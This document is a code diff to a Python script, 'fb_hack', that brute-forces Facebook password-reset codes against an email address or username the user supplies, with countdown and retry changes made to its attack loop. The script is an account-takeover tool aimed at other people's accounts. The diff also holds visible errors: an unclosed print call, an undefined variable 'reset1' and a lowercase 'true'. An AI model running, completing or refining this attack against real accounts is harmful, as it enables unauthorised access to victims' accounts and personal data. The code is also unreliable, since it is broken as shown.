@@ -100,6 +100,14 @@ def passcode8(pass0):
     yo = str(pass1)
   return yo
 
+def sleepy(counter):
+  x = counter
+  y = 0
+  while x > y:
+    x -= 1
+    print(x, end='\r')
+    sleep(1)
+
 def fb_hack(email, codex):
   soup = BeautifulSoup()
   browser = mechanize.Browser()
@@ -149,8 +157,9 @@ def fb_hack(email, codex):
       soup = BeautifulSoup(response1, 'html.parser')
       check1 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
       if check1 == check3:
-        print(s.join(fail))
-        sleep(30)
+        print(s.join(fail)
+        count = 30
+        sleepy(count)
       else:
         soup = BeautifulSoup(response1, 'html.parser')
         if soup.find(string="password_new") == test:
@@ -203,9 +212,11 @@ ehack = input('Email address or username to attack:')
 reset = input('Code: ') or 99999999
 while true:
   try:
-    fb_hack(ehack, reset)
+    if reset >= 0:
+      fb_hack(ehack, reset)
+      reset = reset1
+    else:
+      break
   except:
-    sys.exit()
+    browser.close()
     fb_hack(ehack, reset)
-    
-print("pop")
